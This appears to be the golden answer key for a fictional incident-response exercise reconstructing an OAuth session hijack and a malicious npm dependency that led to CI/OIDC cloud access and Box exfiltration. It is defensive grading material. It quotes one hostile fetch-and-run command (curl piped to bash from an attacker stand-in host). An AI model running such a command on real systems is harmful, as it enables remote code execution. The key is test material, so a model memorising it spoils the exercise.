# Operation Abyssal Lattice — Golden Answer Key

## Executive finding

Halcyon Meridian suffered one coordinated intrusion with two initially separate tracks that converge at Box. Track A compromised executive assistant `e.park@halcyonmeridian.com` through an adversary-in-the-middle board-portal lure, reused the captured session from `45.83.64.19`, obtained delegated OAuth access through `Docs Sync Service`, and accessed confidential board and Meridian diligence material. Track B compromised developer `r.kapoor` through the malicious `build-linker` dependency on `MAC-DEV-17`, established LaunchAgent persistence, modified the `hotfix/cache-key` reusable-workflow ref, used GitHub Actions OIDC to assume `gha-release-role`, reached EKS, decrypted the production Box token, built `regulated_delta.7z`, uploaded it to an open Box share, and enabled its external retrieval.

The decisive correlation is the 11:16:02Z Box download of `regulated_delta.7z` from `45.83.64.19`: the same external IP responsible for the Okta session reuse, Entra access, OAuth consent, and SaaS document activity. This unifies the identity/SaaS and software-supply-chain/cloud tracks without requiring unsupported actor attribution.

## Normalized UTC timeline

- **08:13:54–08:14:05Z — lure and credential/session capture.** `e.park` receives the board-portal email and, from `FIN-WS22` (`10.24.18.41`), visits `review-board-portal.com/session/84e2`. Mail, browser, endpoint, DNS, and proxy records corroborate the click and form submission. The local browser timestamp `2026-03-14 01:13:58 -0700` normalizes to 08:13:58Z.
- **08:16:11–08:21:05Z — session takeover and OAuth persistence.** `45.83.64.19` authorizes `box-sync-docs`, adds `Docs Sync Service`, starts a session flagged for new geography, new ASN, and cookie reuse, signs into M365 with a federated MFA claim, and grants `Files.Read.All`, `Mail.Read`, and `offline_access`. These events establish session/OAuth compromise; they do not establish password theft.
- **08:33:51–08:53:19Z — executive data access.** The same IP accesses `meridian_board_pack_v18.pptx`, downloads `valuation_model_v9.xlsx`, reads `e.park` mail, synchronizes `term_sheet_draft.docx`, and downloads the Google Drive `Meridian diligence summary.docx`. This supports confirmed confidentiality impact to board/M&A material. It does not prove every file in either tenant was accessed.
- **09:02:09–09:02:44Z — blocked expansion attempt.** The same IP sends an MFA push to `a.velasquez`; the challenge is denied. This is attempted expansion, not a second confirmed account compromise.
- **10:05:54–10:06:11Z — developer compromise.** On `MAC-DEV-17`, `r.kapoor` installs `build-linker@4.2.1`; its lifecycle script executes `curl -fsSL https://cdn-build-linker.com/install.sh | bash`. NPM, unified log, osquery, proxy, DNS, EDR, memory strings, and the recovered LaunchAgent corroborate execution and persistence. The package metadata’s version discrepancy must be reported as an artifact requiring explanation, not silently normalized.
- **10:10:41Z — source-control pivot.** GitHub records `r.kapoor` pushing `refs/heads/hotfix/cache-key` to `halcyonmeridian/actions-infra` from `203.0.113.71`, the same documentation-range address serving `cdn-build-linker.com`. The release orchestrator consumes that mutable ref. Slack approval explains why the ref was operationally accepted; it does not make the code trustworthy.
- **10:11:47Z onward — CI/OIDC to cloud.** GitHub Actions run `8841/88421` invokes `AssumeRoleWithWebIdentity` for `gha-release-role`. GitHub Actions, CloudTrail, and EKS records tie the workflow identity `repo:halcyonmeridian/release-orchestrator:ref:refs/heads/hotfix/cache-key` to the cloud session.
- **10:12:03–10:13:19Z — EKS and secret access.** The assumed workload creates `partner-export-sync` and reads the production export Box token. Do not confuse service-account names appearing in compact artifact slices (`prod:release-exporter` versus `release:exporter`); preserve the exact source identity and explain the namespace/context rather than inventing equivalence.
- **10:48Z–10:59:11Z — visibility limitation and confirmed decryption.** The documented data-event configuration change produces a coverage gap. CloudTrail management evidence still confirms KMS `Decrypt` under `gha-release-role` for `/prod/export/box_token` at 10:59:11Z. Missing data events are uncertainty, not proof of anti-forensics and not proof no other objects were touched.
- **11:03:11–11:16:03Z — collection, staging, and exfiltration.** The Kubernetes workload creates `/data/out/regulated_delta.7z` from `customer_delta.parquet` and `partner_map.csv`; `svc-exporter` uploads the 94,513,012-byte archive to `External Shares/Meridian`, creates an open link, and `45.83.64.19` retrieves it. Box, proxy, pod, Kubernetes, DLP, and service telemetry jointly establish successful exfiltration.
- **12:39:18–12:40:01Z — unrelated cryptominer.** `RSCH-JUP-03`/`10.55.72.9`, user `j.mercer`, downloads/runs `xmrig` and contacts `192.0.2.77:3333`. Process, DNS, Zeek, Suricata, and NetFlow make this a real incident, but there is no evidence tying it to the primary campaign.

## Scope and impact

Confirmed affected identities and assets are `e.park`, `r.kapoor`, `FIN-WS22`, `MAC-DEV-17`, the `actions-infra` reusable workflow, release-orchestrator CI trust, `gha-release-role`, the EKS export workload, the production Box token, selected board/M&A documents, and the two named regulated export inputs. `a.velasquez` was targeted but not shown compromised. Release-signing parameter names were reachable and therefore exposed, but `kms_key_usage_summary.txt` records no observed signing operation; signing misuse is not proven. The exact contents of the 94.5 MB archive beyond the two logged inputs, additional mailbox access outside the shown records, and activity hidden by missing data events remain unresolved.

## False signals and independent findings

- The `RSCH-JUP-03` XMRig activity is malicious but independent.
- The documented finance archiving workflow is approved benign behavior and must not be used to inflate exfiltration scope.
- The purple-team beacon is stale exercise residue, not current command and control.
- Routine service-account, cloud, proxy, and SaaS noise in the seven-day corpus is background unless correlated to the exact identities, infrastructure, or objects above.
- Slack approval is evidence of a process/control failure around mutable workflow references, not evidence that the approver joined the intrusion.

## Required response priorities

Immediately revoke `e.park` sessions and OAuth grants, remove `Docs Sync Service`, investigate and protect `a.velasquez`, isolate and rebuild both endpoints, remove the LaunchAgent/package, revoke developer and GitHub credentials, protect the affected branch/ref, disable the compromised workflow, invalidate OIDC/cloud sessions, rotate the Box token and any reachable release/export secrets, remove open Box links, preserve the archive and audit records, and scope all reads during the telemetry gap. Follow with immutable workflow pinning, package provenance/lifecycle controls, least-privilege OIDC conditions, secret-access segmentation, stronger OAuth-consent policy, improved data-event retention, and legal/privacy review for board, M&A, partner, and regulated-data exposure.

## Grading boundaries

High-confidence findings require cited artifacts and exact source values. The report must label facts, inferences, conditional exposure, blocked attempts, and unresolved questions. It must not collapse all alerts into one campaign, claim password theft, claim `a.velasquez` compromise, invent ransomware or destructive impact, assert release signing occurred, treat absent telemetry as exonerating evidence, or attribute the activity to a named threat actor or country.
